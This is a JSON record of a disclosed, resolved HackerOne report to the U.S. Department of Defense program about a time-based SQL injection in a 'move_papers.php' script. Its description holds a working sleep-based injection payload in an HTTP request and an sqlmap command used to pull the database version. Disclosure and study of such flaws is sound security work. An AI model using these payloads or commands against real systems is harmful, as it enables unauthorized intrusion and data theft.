{
  "id": 491191,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTExOTE=",
  "url": "https://hackerone.com/reports/491191",
  "title": "SQL Injection in the `move_papers.php` on the https://██████████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-02-05T02:56:28.657Z",
  "submitted_at": "2019-02-05T02:56:28.657Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sp1d3rs",
    "url": "/sp1d3rs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-06-25T13:07:27.469Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-13T12:45:20.176Z",
  "team_member_agreed_on_going_public_at": "2020-06-25T13:07:27.384Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "##Description\nHello. I was able to find another one Time-based SQLI on the `https://██████████/pubs/move_papers.php` using `pub_group_id` parameter.\n\nThis is my third SQLi (and probably the last one) found on this host. I wasn't able to detect more, but due to the big number of high impact issues found I also recommend to do internal audit of this host to determine other potential issues I could skip. I have feeling that more endpoints can be affected by the sql injection, I just didn't find them all. I'll continue my research and will report other vulnerabilities if I find any.\n\nFor the start, by bruteforcing files in the /pubs/ directory, I came across this script:\nhttps://████████/pubs/move_papers.php\n██████████\nI was able to determine the parameter `pub_group_id` (similar sqli through this parameter was found and reported earlier in other script - `get_publications.php` in #489483 )\n\n##POC\n```\nGET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1\nHost: █████████\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\nCookie: ███████\n\n\n```\nThis request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.\nAs additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:\n```\nsqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5\n```\nwhere test.txt is a text file contained request dump:\n████\nResult:\n```\n5.5.62-0ubuntu0.14.04.1\n```\n█████\nNo sensitive data such as databases, tables, or content was accessed.\n\n## Impact\n\nSQL injection usually have high or critical impact.",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 24,
  "voters": [
    "moloshy",
    "a_d_a_m",
    "brahim_boufakri01",
    "4n_curze",
    "dastan_9408",
    "bryengar",
    "klau5",
    "cyb3r_l3arn3r",
    "r3alitydrift3r",
    "btowers",
    "and 14 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
